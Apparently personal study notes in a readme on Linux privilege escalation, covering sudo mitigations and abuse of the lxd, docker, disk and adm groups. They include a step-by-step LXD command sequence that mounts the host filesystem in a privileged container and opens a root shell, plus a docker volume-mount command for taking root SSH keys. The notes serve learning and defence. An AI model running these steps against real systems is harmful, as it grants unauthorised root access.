readme.md


<a id="org7e0f660"></a>

### Mitigations

[AppArmor](https://wiki.ubuntu.com/AppArmor) in more recent distributions has predefined the commands used with the `postrotate-command`, effectively preventing command execution. Two best practices that should always be considered when provisioning `sudo` rights:

1.  Always specify the absolute path to any binaries listed in the `sudoers` file entry. Otherwise, an attacker may be
    able to leverage PATH abuse (which we will see in the next section) to create a malicious binary that will be
    executed when the command runs (i.e., if the `sudoers` entry specifies `cat` instead of `/bin/cat` this could likely be
    abused).
2.  Grant `sudo` rights sparingly and based on the principle of least privilege. Does the user need full `sudo` rights?
    Can they still perform their job with one or two entries in the `sudoers` file? Limiting the privileged command that
    a user can run will greatly reduce the likelihood of successful privilege escalation.


<a id="org8048c5b"></a>

## Privileged Groups


<a id="org6ddefc3"></a>

### LXC/LXD

LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`. Let's confirm group membership and use these rights to escalate to root.

    id
    
    uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)

Unzip an image for axample `Alpine` (Ubuntu distibutions)

    unzip alpine.zip

Start the `LXD initialization process`. Choose the defaults for each prompt. Consult this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) for more information on each step.

    lxd init
    
    Do you want to configure a new storage pool (yes/no) [default=yes]? yes
    Name of the storage backend to use (dir or zfs) [default=dir]: dir
    Would you like LXD to be available over the network (yes/no) [default=no]? no
    Do you want to configure the LXD bridge (yes/no) [default=yes]? yes
    
    /usr/sbin/dpkg-reconfigure must be run as root
    error: Failed to configure the bridge

`Import` the local image

    lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

`Start` a  privileged container with the `security.privilege` set to `true` to run container without a UID mapping making the root user in the container the same as the root user on the host

    lxc init alpine r00t -c security.privileged=true
    
    Creating r00t

`Mount` the host file system

    lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
    
    Device mydev added to r00t

Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root.

    lxc start r00t
    lxc exec r00t /bin/sh


<a id="org9a17bae"></a>

### Docker

Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command `docker run -v /root:/mnt -it ubuntu`. This command create a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse to the mounted directory and retrieve or add SSH keys for the root user.


<a id="orgc2cae37"></a>

### Disk

Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.


<a id="org0d00eaf"></a>

### ADM

Members of the adm group are able to read all logs stored in `/var/log`. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

    id
    
    uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
